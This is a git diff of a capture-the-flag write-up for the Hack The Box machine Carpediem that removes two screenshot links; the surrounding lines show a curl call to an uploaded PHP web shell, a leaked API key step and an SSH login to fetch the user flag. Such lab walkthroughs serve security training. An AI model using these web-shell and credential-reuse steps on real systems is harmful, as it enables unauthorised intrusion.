@@ -69,7 +69,6 @@ The page shows an error, but Burp's response confirms the file was written. It's
 curl 'http://portal.carpediem.htb/uploads/<ts>_p.php?cmd=id'   # uid=33(www-data)
 ```
 
-![backdrop-module-rce](/assets/Images/carpediem-003_foothold_backdrop-module-rce.png)
 
 **Step 3 — leaked API key → VoIP creds.** Inside the container, the portal source hard-codes a Trudesk API key:
 
@@ -111,7 +110,6 @@ ssh hflaccus@10.10.11.167
 cat /home/hflaccus/user.txt   # HTB{...}
 ```
 
-![user-flag](/assets/Images/carpediem-001_foothold_user-flag.png)
 
 Shell as `hflaccus` achieved.
 
